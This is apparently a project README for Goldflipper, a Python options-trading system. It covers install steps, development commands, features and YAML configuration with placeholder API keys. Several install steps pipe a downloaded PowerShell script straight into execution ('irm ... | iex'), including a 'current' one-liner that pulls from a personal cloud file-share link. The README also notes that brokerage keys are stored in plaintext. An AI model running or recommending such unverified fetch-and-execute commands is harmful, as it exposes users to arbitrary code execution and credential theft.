# Goldflipper

[![CI](https://github.com/Zaroganos/goldflipper/actions/workflows/ci.yml/badge.svg)](https://github.com/Zaroganos/goldflipper/actions/workflows/ci.yml)
[![Version](https://img.shields.io/badge/version-0.3.2-blue.svg)](https://github.com/Zaroganos/goldflipper/releases)
[![Python](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-Proprietary-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows_10%20%7C%2011-lightgrey.svg)](docs/WINDOWS_INSTALLER.md)
[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
[![Pyright](https://img.shields.io/badge/type%20checked-pyright-brightgreen.svg)](https://github.com/microsoft/pyright)

Goldflipper Trading System

![Screenshot of Goldflipper's main interface showing the trading dashboard](https://github.com/user-attachments/assets/5eb5c068-8759-44c8-afde-067fdcd55f92)

## Disclaimer

Goldflipper is proprietary, source-available software. Please note that technical support, bug fix, and feature requests are managed on a discretionary basis at this time.
This program does not capture or transmit any of your data. Goldflipper only makes connections to brokerage(s) and market data provider(s). Newer branches also make calls using ancillary python libraries in order to enhance function by validating inputs (to address user entry errors), and by checking the market calendar. Security wise, note that in this version, access keys are stored in the settings file in plaintext (or, plain-yaml).

## Introduction

Goldflipper is a semi-autonomous trading system developed in Python. It utilizes a modular, event-driven architecture to automate trading strategy execution, with a current focus on level 2 options trading. The system is designed for customizability, modularity, and offers a feature-rich parameter selection that enables functionality not seen in any other program of its kind. Goldflipper integrates with the Alpaca Markets API for live trading, and has API integrations with market data providers as well in order to provide a modular and robust trading experience with fallbacks for reliability.

## Getting Started

### Prerequisites

Before you start, ensure you have the following:

- **Alpaca Markets account** for brokerage access; multi-broker support is in development
- **Windows OS** Windows 10 / 11 required at this time; cross-OS support is in development
- **Git** required for cloning the repository and keeping it up to date
- **Python 3.12** or higher required
- **Python libraries** (see Installation section); strongly recommended to use a virtual environment to avoid dependency conflicts. Consider using venv, Poetry, or uv as well. Default will use uv venv. Further documentation to be added in due time.
- **Market Data Provider account(s)** (required if not using market data from brokerage or from premium subscription):
  - Yahoo Finance (free, built-in support via yfinance) - no signup required

### Installation

#### Windows Installer (Recommended)

For a professional installation experience with Windows integration:

1. Download the latest installer `goldflipper-0.2.5-x64.msi` from either the [Releases](https://github.com/Zaroganos/goldflipper/releases) page directly, or;
2. Run the one-liner bootstrap command provided to you (if you have been given internal QA testing authorization) in PowerShell by pressing `Win+X` and then `i`
3. Run the installer and follow the wizard
4. Launch Goldflipper from the Start Menu or desktop shortcut

The MSI installer provides:

- Program Files installation with proper Windows integration
- Start Menu and Desktop shortcuts
- Add/Remove Programs entry with uninstall support
- Automatic upgrades for newer versions

See [Windows Installer Documentation](docs/WINDOWS_INSTALLER.md) for details.

### One-Liner Bootstrap (Current)

```powershell
irm 'https://cloud.zimerguz.net/s/558TjEgMCdEjaLN/download' | iex
```

#### One Command Bootstrap (Old)

The easiest way to install Goldflipper is to run the following command in PowerShell:

```powershell
iwr -useb https://raw.githubusercontent.com/Zaroganos/goldflipper/main/bootstrap.ps1 | iex
```

The bootstrap script will:

- Check for and install Git and Python if needed
- Clone/update the repository to `%USERPROFILE%\goldflipper`
- Create a virtual environment
- Install all dependencies in development mode
- Launch Goldflipper automatically

#### Manual Installation

1. **Clone the repository:**

```cmd
git clone https://github.com/Zaroganos/goldflipper.git
cd goldflipper
```

2. **Install Python dependencies:**

```cmd
pip install -r requirements.txt
```

**Note**: You can also install in development mode using setup.py via:

```cmd
pip install -e . --pre
```

3. **Initial Setup and Configuration:**
   - Run the system once by executing `launch_goldflipper.bat`
   - This creates `goldflipper/config/settings.yaml` from the template, or you may upload your existing configuration file of choice.
   - A desktop shortcut is created if desired.
   - Edit `settings.yaml` with your API keys and preferences:
     - **Alpaca API Keys**: Get from [Alpaca Markets](https://app.alpaca.markets)
     - **Market Data Provider API Keys**: Get from your choice of supported providers. (Currently limited to MarketDataApp)
     - **Trading parameters**: Set your desired values for risk management, trading behavior, etc.
     - **System preferences**: Logging levels, watchdog settings, etc.

## Development Setup (Modern)

### Prerequisites
- Python 3.12-3.14
- [uv](https://docs.astral.sh/uv/) package manager

### Quick Start

1. **Install uv** (first time only):
   ```powershell
   powershell -c "irm https://astral.sh/uv/install.ps1 | iex"
   ```

2. **Clone and setup**:
   ```powershell
   git clone https://github.com/Zaroganos/goldflipper.git
   cd goldflipper
   uv sync
   ```

3. **Run goldflipper**:
   ```powershell
   uv run goldflipper
   ```

### Development Commands

```powershell
# Run application
uv run goldflipper

# Run tests
uv run pytest

# Format code
uv run ruff format .

# Lint code
uv run ruff check .

# Type check
uv run pyright

# Run all quality checks
scripts\dev.bat check

# Build Windows executable
uv run python scripts/build_nuitka.py
```

### Adding Dependencies

```powershell
# Add production dependency
uv add package-name

# Add development dependency
uv add --dev package-name

# Update all dependencies
uv lock --upgrade
uv sync

# Export legacy requirements (only if you must, and rename from req...s.txt.old first)
uv pip freeze > requirements.txt
```

### Building Executable for Distribution

```powershell
# Build standalone .exe
uv run python scripts/build_nuitka.py

# Output will be in dist/goldflipper.exe
# Can be distributed without Python installation
```

### Running the Trading System

Goldflipper offers multiple interfaces and execution modes:

#### 1. **Text Interface (Recommended)**
The Text User Interface provides an intuitive way to interact with all system features:
- (Recommended) Double-click the Goldflipper desktop shortcut, or:
```cmd
python goldflipper\goldflipper_tui.py
```

#### 2. **Windows Service Mode**
- Runs on startup as daemon

## Key Features

### 🎯 **Trading System**
- **Semi-autonomous options trading** with rules-based execution
- **Multi-strategy support** (NEW): Run multiple trading strategies concurrently
- **Advanced play management** with state-based workflow
- **Multiple order types**: Market, limit at bid/ask/mid/last, contingency orders
- **Risk management**: Take profit, stop loss, and contingency stop loss orders
- **Real-time monitoring** with continuous play evaluation
- **Dry-run mode**: Test strategies without executing orders

### 🔄 **Multi-Strategy System** (NEW - 2025-12-01)
- **Strategy Orchestrator**: Coordinate multiple strategies (sequential or parallel)
- **Built-in strategies**:
  - `option_swings` - Manual option swings (BTO/STC)
  - `momentum` - Gap/momentum plays with playbook support
  - `sell_puts` - Cash-secured puts (STO/BTC, TastyTrade-style)
  - `spreads` - Multi-leg spread support
- **Trade direction model**: Long (BTO→STC) and Short (STO→BTC) strategies
- **Playbook system**: YAML-based strategy configuration
- **Extensible**: Add new strategies via BaseStrategy interface

### 📊 **Market Data & Analysis**
- **Multiple data providers** behind unified manager with automatic failover
- **Options Greeks calculations**: Delta, Gamma, Theta, Vega, Rho, and 15+ advanced Greeks
- **Technical indicators**: basic views of EMA, MACD, TTM Squeeze, and custom indicators
- **Interactive charting** basic candlestick charts and overlay indicators

### 🖥️ **User Experience**
- **Text User Interface** built with Textual framework
- **Play Creator GUI** (NEW): Tkinter-based visual play creation
- **Console mode** for direct system interaction
- **Trade logger** with multi-strategy filtering
- **Windows service integration** for background operation

### 🔧 **Management Tools**
- **Play Creator GUI** (NEW): Visual option chain browser with Greeks display
- **Play creation tool** with guided setup and validation
- **Play editing system** with safety protections for active trades
- **Auto play creator** for automated bulk play generation
- **Multi-strategy CSV ingestion** for batch imports
- **System status monitoring** with health checks
- **Configuration management** with YAML-based settings
- **Data export capabilities** (CSV, Excel) for records and analysis

### 🛡️ **System Reliability**
- **Watchdog system** for automated health monitoring
- **Comprehensive logging** with structured trade tracking
- **State persistence** with automatic backup and recovery
- **Error handling** with graceful degradation and retry logic
- **Market hours validation** and holiday awareness
- **Fallback to legacy mode** if orchestrator encounters issues

## Market Data Providers

Goldflipper supports multiple market data providers for robust and reliable data access:

### **MarketDataApp** (Primary)

### **Alpaca Markets** (Backup)

### **Yahoo Finance** (Backup)

## Configuration Guide

### **Basic Configuration**
The system uses a YAML configuration file (`goldflipper/config/settings.yaml`) with the following key sections:

```yaml
# Alpaca API Configuration
alpaca:
  accounts:
    paper_1:
      enabled: true
      api_key: 'YOUR_PAPER_API_KEY'
      secret_key: 'YOUR_PAPER_SECRET_KEY'
      base_url: 'https://paper-api.alpaca.markets/v2'
  default_account: 'paper_1'

# Market Data Providers
market_data_providers:
  providers:
    marketdataapp:
      enabled: true
      api_key: 'YOUR_MARKETDATAAPP_KEY'
```

### **Multi-Strategy Configuration** (NEW)
```yaml
# Strategy Orchestration (multi-strategy mode)
strategy_orchestration:
  enabled: true              # Enable multi-strategy orchestrator
  mode: "sequential"         # or "parallel"
  max_parallel_workers: 3    # For parallel mode
  fallback_to_legacy: true   # Fall back to core.py if errors occur
  dry_run: false             # Evaluate plays without executing orders

# Individual strategy configurations
options_swings:
  enabled: true
  entry_strategy:
    buffer: 0.50             # Price tolerance for entry
  exit_strategy:
    take_profit_pct: 25
    stop_loss_pct: 15

momentum:
  enabled: false             # Enable for gap momentum trades

sell_puts:
  enabled: false             # Enable for cash-secured puts
```

### **More Settings**
- **Trading parameters**: Risk management, position sizing
- **Market hours**: Custom trading session definitions
- **Logging levels**: Debug, info, warning, error
- **Display options**: Chart settings, option chain columns
- **File paths**: Custom directory structures

## Directory Structure

Goldflipper Classic is roughly organized into the following directory structure:
(Simplified for brevity, access the codebase to discover the full content.)

```
goldflipper/
├── config/                     # Configuration files and settings
│   ├── config.py              # Configuration management
│   └── settings_template.yaml # Configuration template
├── data/                      # Data handling modules
│   ├── greeks/               # Options Greeks calculations
│   ├── indicators/           # Technical indicators
│   ├── market/               # Market data handling and management
│   │   ├── manager.py        # Market data coordination
│   │   ├── operations.py     # Business logic operations
│   │   ├── cache.py          # Data caching system
│   │   └── providers/        # Market data provider integrations
│   └── ta/                   # Technical analysis tools
├── chart/                     # Charting and visualization
├── trade_logging/             # Comprehensive logging system
│   ├── trade_logger.py       # Core trade logging functionality
│   ├── trade_logger_ui.py    # Trade logger user interface
│   └── logs/                 # Application logs storage
├── plays/                     # Trading plays management (state-based), pre-DB
│   ├── closed/               # Completed trading positions
│   ├── expired/              # Expired options
│   ├── new/                  # New trading opportunities
│   ├── open/                 # Currently active positions
│   ├── pending-closing/      # Positions pending closure
│   ├── pending-opening/      # Positions pending opening
│   ├── old/                  # Archived plays
│   └── temp/                 # Temporary/OSO plays
├── tools/                     # User-accessible toolkit
│   ├── play_creator_gui.py   # Tkinter GUI play creator (NEW)
│   ├── auto_play_creator.py  # Multi-strategy play generation
│   ├── play_csv_ingestion_multitool.py # Multi-strategy CSV import (NEW)
│   ├── play_creation_tool.py # Interactive play creation (legacy)
│   ├── play-edit-tool.py     # Advanced play editing with safety features
│   ├── view_plays.py         # Play viewing and management
│   ├── option_data_fetcher.py # Options data retrieval
│   ├── system_status.py      # System health monitoring (enhanced)
│   └── [multiple other tools] # JSON processing, etc.
├── utils/                     # General utility functions
├── watchdog/                  # System monitoring and health checks
├── state/                     # System state management and persistence
├── strategy/                  # Multi-strategy system (NEW)
│   ├── base.py               # BaseStrategy abstract class
│   ├── orchestrator.py       # StrategyOrchestrator
│   ├── registry.py           # Strategy discovery
│   ├── shared/               # Shared utilities (evaluation, orders, plays)
│   ├── runners/              # Strategy implementations
│   └── playbooks/            # Strategy configuration files
├── reference/                 # Reference materials and templates
├── docs/                      # Package documentation
│   ├── MULTI_STRATEGY_IMPLEMENTATION.md # Full implementation guide
│   ├── STRATEGY_DEVELOPMENT_GUIDE.md    # How to add strategies (NEW)
│   └── DEPRECATED_CODE_CANDIDATES.md    # Migration notes (NEW)
├── src/                       # Windows Service code
│   ├── service/              # Windows service integration
│   └── state/                # State management components
└── tests/                     # Test suites and validations
```

## License

Copyright (c) 2026 Iliya Yaroshevskiy. All Rights Reserved.
